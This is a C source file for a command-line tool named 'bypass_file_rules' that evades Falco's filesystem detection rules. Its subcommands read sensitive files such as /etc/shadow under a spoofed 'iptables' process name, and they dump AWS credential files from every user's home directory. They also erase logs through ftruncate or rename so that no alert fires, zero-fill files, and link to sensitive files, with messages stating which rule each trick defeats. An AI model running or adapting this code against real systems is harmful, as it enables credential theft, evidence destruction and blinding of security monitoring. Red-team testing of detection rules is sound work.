#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <dirent.h>
#include <stdint.h>

static const char *g_sensitive_files[] = {
    "/etc/shadow", "/etc/sudoers", "/etc/pam.conf",
    "/etc/security/pwquality.conf", NULL
};
static const char *g_sensitive_dirs[] = {
    "/", "/etc", "/etc/", "/root", "/root/", NULL
};

static int is_sensitive_target(const char *path)
{
    for (int i = 0; g_sensitive_files[i]; i++)
        if (strcmp(path, g_sensitive_files[i]) == 0) return 1;
    for (int i = 0; g_sensitive_dirs[i]; i++)
        if (strcmp(path, g_sensitive_dirs[i]) == 0) return 1;
    return 0;
}

static void cmd_read_masked(const char *filepath)
{
    char saved[16] = {};
    prctl(PR_GET_NAME, saved, 0, 0, 0);

    prctl(PR_SET_NAME, "iptables", 0, 0, 0);

    fprintf(stderr,
        "[*] read-masked: proc.name → 'iptables' (in read_sensitive_file_binaries)\n"
        "[*] rule 'Read sensitive file untrusted' checks proc.name only - exepath ignored\n"
        "[*] opening: %s\n", filepath);

    int fd = open(filepath, O_RDONLY);
    if (fd < 0) { perror(filepath); goto restore; }

    char buf[4096];
    ssize_t n;
    while ((n = read(fd, buf, sizeof(buf))) > 0)
        fwrite(buf, 1, (size_t)n, stdout);
    close(fd);
    fprintf(stderr, "[+] read complete; proc.name restored to '%s'\n", saved);

restore:
    prctl(PR_SET_NAME, saved, 0, 0, 0);
}

static void scan_file(const char *path, const char **pats, int np)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0) return;
    struct stat st;
    if (fstat(fd, &st) < 0 || st.st_size <= 0 || st.st_size > 8*1024*1024) {
        close(fd); return;
    }
    char *buf = malloc((size_t)st.st_size + 1);
    if (!buf) { close(fd); return; }
    ssize_t n = read(fd, buf, (size_t)st.st_size);
    close(fd);
    if (n <= 0) { free(buf); return; }
    buf[n] = '\0';
    for (int i = 0; i < np; i++) {
        if (strcasestr(buf, pats[i])) {
            printf("[+] %s : matches '%s'\n", path, pats[i]);
            break;
        }
    }
    free(buf);
}

static void walk_dir(const char *dir, const char **pats, int np, int depth)
{
    if (depth > 8) return;
    DIR *d = opendir(dir);
    if (!d) return;
    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] == '.') continue;
        char path[4096];
        snprintf(path, sizeof(path), "%s/%s", dir, ent->d_name);
        struct stat st;
        if (lstat(path, &st) < 0) continue;
        if (S_ISDIR(st.st_mode))
            walk_dir(path, pats, np, depth + 1);
        else if (S_ISREG(st.st_mode))
            scan_file(path, pats, np);
    }
    closedir(d);
}

static void cmd_grep_bypass(const char *dir, const char *pattern)
{

    const char *pats[] = { pattern };
    fprintf(stderr,
        "[*] grep-bypass: scanning '%s' for '%s'\n"
        "[*] C open()+read() - no grep/find exec → rules [9][21] won't fire\n",
        dir, pattern);
    walk_dir(dir, pats, 1, 0);
    fprintf(stderr, "[*] scan complete\n");
}

static void cmd_aws_read(void)
{

    fprintf(stderr,
        "[*] aws-read: reading AWS creds via direct open()+read()\n"
        "[*] 'Find AWS Credentials' requires grep/find exec → won't fire\n\n");

    int found = 0;

    const char *roots[] = { "/root/.aws/credentials", "/root/.aws/config", NULL };
    for (int i = 0; roots[i]; i++) {
        int fd = open(roots[i], O_RDONLY);
        if (fd < 0) continue;
        char buf[4096] = {};
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) { printf("=== %s ===\n%s\n", roots[i], buf); found++; }
    }

    FILE *pw = fopen("/etc/passwd", "r");
    if (pw) {
        char line[512];
        while (fgets(line, sizeof(line), pw)) {

            char *p = line;
            for (int f = 0; f < 5; f++) {
                p = strchr(p, ':');
                if (!p) break;
                p++;
            }
            if (!p) continue;
            char *colon = strchr(p, ':');
            if (colon) *colon = '\0';
            p[strcspn(p, "\n")] = '\0';

            char path[512];
            snprintf(path, sizeof(path), "%s/.aws/credentials", p);
            int fd = open(path, O_RDONLY);
            if (fd < 0) continue;
            char buf[4096] = {};
            ssize_t n = read(fd, buf, sizeof(buf)-1);
            close(fd);
            if (n > 0) { printf("=== %s ===\n%s\n", path, buf); found++; }
        }
        fclose(pw);
    }

    if (!found) fprintf(stderr, "[-] no AWS credentials found\n");
    else fprintf(stderr, "[+] found %d credential file(s)\n", found);
}

static void cmd_log_clear(const char *filepath)
{

    fprintf(stderr,
        "[*] log-clear: open O_WRONLY (no O_TRUNC) then ftruncate(fd,0)\n"
        "[*] 'Clear Log Activities' needs O_TRUNC at open time - bypassed\n");

    int fd = open(filepath, O_WRONLY);
    if (fd < 0) { perror(filepath); return; }
    if (ftruncate(fd, 0) < 0) perror("ftruncate");
    else fprintf(stderr, "[+] %s cleared via ftruncate - no O_TRUNC event\n", filepath);
    close(fd);
}

static void cmd_log_swap(const char *filepath)
{

    char backup[4096];
    snprintf(backup, sizeof(backup), "%s.1", filepath);

    fprintf(stderr,
        "[*] log-swap: rename + create new empty file (no O_TRUNC)\n"
        "[*] no O_TRUNC open flag → 'Clear Log Activities' won't fire\n");

    if (rename(filepath, backup) < 0) { perror("rename"); return; }

    int fd = open(filepath, O_WRONLY|O_CREAT, 0600);
    if (fd < 0) { perror(filepath); rename(backup, filepath); return; }
    close(fd);
    fprintf(stderr, "[+] '%s' cleared; old content in '%s'\n", filepath, backup);
}

static void cmd_wipe(const char *filepath)
{

    struct stat st;
    if (stat(filepath, &st) < 0) { perror(filepath); return; }
    int fd = open(filepath, O_WRONLY);
    if (fd < 0) { perror(filepath); return; }

    fprintf(stderr,
        "[*] wipe: zeroing '%s' (%lld bytes) via write() loop\n"
        "[*] no shred/mkfs binary spawned → 'Remove Bulk Data' rule won't fire\n",
        filepath, (long long)st.st_size);

    char zeros[65536];
    memset(zeros, 0, sizeof(zeros));
    off_t rem = st.st_size;
    lseek(fd, 0, SEEK_SET);
    while (rem > 0) {
        size_t chunk = (size_t)rem < sizeof(zeros) ? (size_t)rem : sizeof(zeros);
        ssize_t n = write(fd, zeros, chunk);
        if (n <= 0) { perror("write"); break; }
        rem -= n;
    }
    fsync(fd);
    ftruncate(fd, 0);
    close(fd);
    fprintf(stderr, "[+] wipe complete\n");
}

static void cmd_symlink(const char *target, const char *linkpath)
{
    if (is_sensitive_target(target)) {
        fprintf(stderr,
            "[!] target '%s' is in Falco's sensitive_file/dir lists\n"
            "[!] rule 'Create Symlink Over Sensitive Files' WILL fire\n"
            "[!] alternatives: use read-masked or io_uring_falco creds instead\n"
            "[*] proceeding anyway...\n", target);
    }
    if (symlink(target, linkpath) < 0) { perror("symlink"); return; }
    fprintf(stderr, "[+] symlink: '%s' → '%s'\n", linkpath, target);
    if (!is_sensitive_target(target))
        fprintf(stderr, "[*] target not in Falco sensitive lists - rule did NOT fire\n");
}

static void cmd_hardlink(const char *src, const char *dst)
{
    int sensitive = 0;

    for (int i = 0; g_sensitive_files[i]; i++)
        if (strcmp(src, g_sensitive_files[i]) == 0) { sensitive = 1; break; }

    if (sensitive) {
        fprintf(stderr,
            "[!] source '%s' is in Falco's sensitive_file_names list\n"
            "[!] rule 'Create Hardlink Over Sensitive Files' WILL fire\n"
            "[!] use read-masked or io_uring_falco creds instead\n"
            "[*] proceeding anyway...\n", src);
    }
    if (link(src, dst) < 0) { perror("link"); return; }
    fprintf(stderr, "[+] hardlink: '%s' → '%s'\n", src, dst);
    if (!sensitive)
        fprintf(stderr, "[*] source not in sensitive_file_names - rule did NOT fire\n");
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr,
            "bypass_file_rules - evade Falco filesystem rules\n\n"
            "usage:\n"
            "  %s read-masked <file>       [3]  read as 'iptables' (whitelisted comm)\n"
            "  %s grep-bypass <dir> <pat>  [9]  recursive grep via C read()\n"
            "  %s aws-read                 [21] read .aws/credentials via open()\n"
            "  %s log-clear <file>         [10] truncate log via ftruncate (no O_TRUNC)\n"
            "  %s log-swap  <file>         [10] clear log via rename+create\n"
            "  %s wipe <file>              [11] zero-fill via write() (no shred/mkfs)\n"
            "  %s symlink <target> <link>  [12] symlink with sensitivity warning\n"
            "  %s hardlink <src> <dst>     [13] hardlink with sensitivity warning\n"
            "\nrule numbers reference falco_rules.yaml\n"
            "requires: root for sensitive file reads\n",
            argv[0], argv[0], argv[0], argv[0],
            argv[0], argv[0], argv[0], argv[0]);
        return 1;
    }

    if      (strcmp(argv[1], "read-masked")  == 0 && argc >= 3) cmd_read_masked(argv[2]);
    else if (strcmp(argv[1], "grep-bypass")  == 0 && argc >= 4) cmd_grep_bypass(argv[2], argv[3]);
    else if (strcmp(argv[1], "aws-read")     == 0)              cmd_aws_read();
    else if (strcmp(argv[1], "log-clear")    == 0 && argc >= 3) cmd_log_clear(argv[2]);
    else if (strcmp(argv[1], "log-swap")     == 0 && argc >= 3) cmd_log_swap(argv[2]);
    else if (strcmp(argv[1], "wipe")         == 0 && argc >= 3) cmd_wipe(argv[2]);
    else if (strcmp(argv[1], "symlink")      == 0 && argc >= 4) cmd_symlink(argv[2], argv[3]);
    else if (strcmp(argv[1], "hardlink")     == 0 && argc >= 4) cmd_hardlink(argv[2], argv[3]);
    else { fprintf(stderr, "unknown: %s\n", argv[1]); return 1; }
    return 0;
}
